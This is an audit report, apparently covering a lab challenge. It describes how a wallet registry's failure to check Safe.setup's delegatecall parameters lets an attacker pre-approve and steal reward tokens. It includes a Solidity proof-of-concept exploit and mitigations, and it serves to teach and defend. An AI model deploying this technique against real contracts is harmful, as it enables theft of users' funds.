---
title: Backdoor Audit Report
author: Jack
date: January 15, 2026
header-includes:
  - \usepackage{titling}
  - \usepackage{graphicx}
---


Prepared by: [Jack](https://github.com/Jack-OuCJ)

# Table of Contents
- [Severity Classification](#severity-classification)
- [Summary](#summary)
- [Findings](#findings)
  - [High](#high)

# Severity Classification

| Severity         | Description |
| ---------------- | ----------- |
| ![high]          | A **directly** exploitable security vulnerability that leads to stolen/lost/locked/compromised assets or catastrophic denial of service. |
| ![medium]        | Assets not at direct risk, but the function of the protocol or its availability could be impacted. |
| ![low]           | A violation of common best practices or incorrect usage of primitives, which may not currently have a major impact on security. |
| ![informational] | Non-critical comments, recommendations or potential optimizations, not relevant to security. |

# Summary

| Severity         | Number of issues found |
| ---------------- | ---------------------- |
| ![high]          | 1                      |
| ![medium]        | 0                      |
| ![low]           | 0                      |
| ![informational] | 0                      |
| Total            | 1                      |

# Findings

## High

### [H-1] `WalletRegistry` does not restrict `Safe.setup` `to`/`data` parameters, allowing attacker to execute arbitrary code during wallet initialization and steal reward tokens

**Description:** `WalletRegistry::proxyCreated()` validates key Safe configuration parameters (factory, singleton, owner count, threshold, fallbackManager) when a new Safe wallet is created. However, it does not validate the `to` and `data` parameters passed to `Safe.setup()`, which control an optional `delegatecall` executed during Safe initialization:

```solidity
// WalletRegistry.sol — validation logic
if (bytes4(initializer[:4]) != Safe.setup.selector) revert InvalidInitialization();
// Checks: threshold == 1, owners.length == 1, fallbackManager == address(0)
// ⚠️ Does NOT check: to, data, payment, paymentToken fields of Safe.setup()
```

Inside `Safe::setup()`, there is a call to `setupModules(to, data)` which performs a `delegatecall` on `to` with `data`. Because this is `delegatecall`, it runs in the context of the new Safe wallet (the proxy):

```solidity
// Safe.sol (simplified)
function setup(..., address to, bytes calldata data, ...) external {
    setupModules(to, data); // ⚠️ delegatecall to arbitrary address in Safe's context
    ...
}
```

An attacker can pass `to = helperContract` and `data = token.approve(attacker, max)` encoded. The delegatecall executes `approve` as if it were signed by the Safe itself. When `WalletRegistry` subsequently transfers 10 DVT reward tokens into the new Safe, the attacker immediately calls `transferFrom(wallet, recovery, 10e18)` using the pre-authorized allowance to steal them.

**Impact:** An attacker can steal all 40 DVT reward tokens (10 DVT per beneficiary × 4 beneficiaries) without the knowledge or consent of any beneficiary. All four Safe wallets are created with a hidden backdoor (pre-approved token allowance), allowing the attacker to drain each wallet immediately upon reward distribution.

**Proof of Concept:**

```solidity
contract BackdoorHelper {
    function approveToken(address token, address spender) external {
        IERC20(token).approve(spender, type(uint256).max);
        // Runs in Safe's context via delegatecall → Safe approves spender
    }
}

// For each beneficiary:
bytes memory initData = abi.encodeCall(
    Safe.setup,
    (
        owners,           // [beneficiary]
        1,                // threshold
        address(helper),  // ⚠️ to: attacker's helper contract
        abi.encodeCall(helper.approveToken, (address(token), attacker)), // ⚠️ data
        address(0), address(0), 0, payable(address(0))
    )
);
factory.createProxyWithCallback(singleton, initData, saltNonce, registry);
// Registry validates → sends 10 DVT reward to wallet
token.transferFrom(wallet, recovery, 10e18); // Steal using pre-approved allowance
```

**Recommended Mitigation:**

1. **Validate `to` and `data` in `proxyCreated`:** Decode the `initializer` payload and enforce that the `to` field is `address(0)` and `data` is empty, preventing any delegatecall during setup:

   ```solidity
   (, , address to, bytes memory data, , , , ) = abi.decode(
       initializer[4:], (address[], uint256, address, bytes, address, address, uint256, address)
   );
   if (to != address(0) || data.length != 0) revert InvalidInitialization();
   ```

2. **Registry-controlled initialization:** Instead of accepting an external `initializer`, have the registry construct the `Safe.setup` calldata internally with known-safe parameters.

3. **Delayed reward distribution:** Do not transfer rewards inside `proxyCreated`. Instead, require the beneficiary to claim their reward via a separate signed transaction, ensuring the owner has evaluated the wallet configuration.

[high]: https://img.shields.io/badge/-High-red "High"
[medium]: https://img.shields.io/badge/-Medium-orange "Medium"
[low]: https://img.shields.io/badge/-Low-yellow "Low"
[informational]: https://img.shields.io/badge/-Informational-blue "Informational"
